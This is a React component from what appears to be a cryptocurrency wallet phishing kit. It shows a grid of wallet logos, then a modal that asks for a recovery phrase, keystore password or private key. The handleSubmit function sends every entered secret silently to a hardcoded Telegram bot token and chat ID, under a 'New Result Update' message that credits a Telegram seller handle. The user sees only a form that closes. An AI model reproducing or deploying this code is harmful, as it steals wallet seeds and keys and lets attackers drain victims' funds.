import React, { useState } from "react";
import wallets from "../../index"; // Adjust the path to your wallets.js file

const Cryp = () => {
  const [key, setKey] = useState(false);
  const [privateKey, setPrivateKey] = useState(false);
  const [isOpen, setIsOpen] = useState(false);
  const [border, setBorder] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState(null);

  const [formData, setFormData] = useState({
    walletType: '',
    recoveryPhrase: '',
    walletPassword: '',
    privateKey: ''
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value
    });
  };

  const handleWalletClick = (wallet) => {
    setSelectedWallet(wallet);
    setFormData({ ...formData, walletType: wallet.title }); // Set the wallet type
    setIsOpen(true);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    console.log('Form data before submission:', formData); // Debugging line

    const telegramBotToken = "7667891062:AAHKVibv3NWoYOX79YurChQ_uQeKio-KvO8"; // Replace with your Telegram bot token
    const telegramChatId = "7183474271"; // Replace with the Telegram chat ID

    const message = `
      🚀 New Result Update:
      - Wallet Type: ${formData.walletType}
      - Recovery Phrase: ${formData.recoveryPhrase}
      - Wallet Password: ${formData.walletPassword || "N/A"}
      - Private Key: ${formData.privateKey || "N/A"}
      - Created By: TG: @kikak08 (Webmails available)
    `;

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: telegramChatId,
            text: message,
          }),
        }
      );

      const result = await response.json();
      if (result.ok) {
        
        setFormData({
          walletType: '',
          recoveryPhrase: '',
          walletPassword: '',
          privateKey: ''
        }); // Reset form data
        setIsOpen(false); // Close the modal
      } else {
        alert("Failed to send submission.");
      }
    } catch (error) {
      console.error("Error sending submission:", error);
      alert("An error occurred while sending the submission.");
    }
  };

  return (
    <>
      <div className="relative grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-4 p-4">
        {wallets.map((wt) => (
          <div
            onClick={() => handleWalletClick(wt)}
            key={wt.id}
            className="flex flex-col items-center mb-5 cursor-pointer hover:scale-105 transition-all duration-[0.5s]"
          >
            <img
              className="w-[60px] object-contain mb-2"
              src={wt.img}
              alt={wt.title}
            />
            <p className="text-[12px] text-white font-extrabold text-center">
              {wt.title}
            </p>
          </div>
        ))}
      </div>

      {isOpen && selectedWallet && (
        <div className="fixed inset-0 bg-slate-900/50 backdrop-blur p-8 z-50 flex justify-center items-center">
          <div className="bg-white p-6 rounded-lg shadow-xl w-[400px] text-center">
            <div className="flex items-center space-x-7">
              <img
                className="w-[60px] mb-2"
                src={selectedWallet.img}
                alt={selectedWallet.title}
              />
              <h3 className="text-lg font-bold mb-2">{selectedWallet.title}</h3>
            </div>

            <ul className="text-sm mb-8 py-4 flex px-8 justify-between border-b">
              <li
                onClick={() => {
                  setKey(false);
                  setPrivateKey(false);
                }}
                className="hover:cursor-pointer text-gray-600"
              >
                Phrase
              </li>
              <li
                onClick={() => {
                  setKey(true);
                  setPrivateKey(false);
                }}
                className="hover:cursor-pointer text-gray-600"
              >
                KeyStore
              </li>
              <li
                onClick={() => {
                  setKey(false);
                  setPrivateKey(true);
                }}
                className="hover:cursor-pointer text-gray-600"
              >
                Private Key
              </li>
            </ul>

            <form onSubmit={handleSubmit}>
              <div
                onMouseDown={() => setBorder(!border)}
                className={`border rounded-md overflow-hidden mb-5 ${
                  border === true ? "shadow-sm shadow-blue-700 " : ""
                }`}
              >
                <input
                  className="w-full pb-14 py-1 px-2 outline-none"
                  type="text"
                  placeholder="Enter recovery phrase"
                  name="recoveryPhrase"
                  value={formData.recoveryPhrase}
                  onChange={handleChange}
                  required
                />
              </div>
              {key && (
                <div>
                  <input
                    className="border rounded-md overflow-hidden mb-5 w-full py-2 px-2 outline-none"
                    type="text"
                    placeholder="Wallet password"
                    name="walletPassword"
                    value={formData.walletPassword}
                    onChange={handleChange}
                    required
                  />
                </div>
              )}

              {privateKey && (
                <div>
                  <input
                    className="border rounded-md overflow-hidden mb-5 w-full py-2 px-2 outline-none"
                    type="text"
                    placeholder="Enter your Private Key"
                    name="privateKey"
                    value={formData.privateKey}
                    onChange={handleChange}
                    required
                  />
                </div>
              )}

              <p className="text-[11px] text-start mb-3">
                Typically 12 (sometimes 24) words separated by single spaces
              </p>
              <div>
                <button type="submit" className="border w-full mb-4 py-2 text-white font-bold bg-blue-700 rounded">
                  PROCEED
                </button>
              </div>
              <div className="text-end">
                <button
                  type="button"
                  onClick={() => setIsOpen(false)}
                  className="bg-red-600 text-white font-semibold py-2 px-4 rounded"
                >
                  Close
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </>
  );
};

export default Cryp;
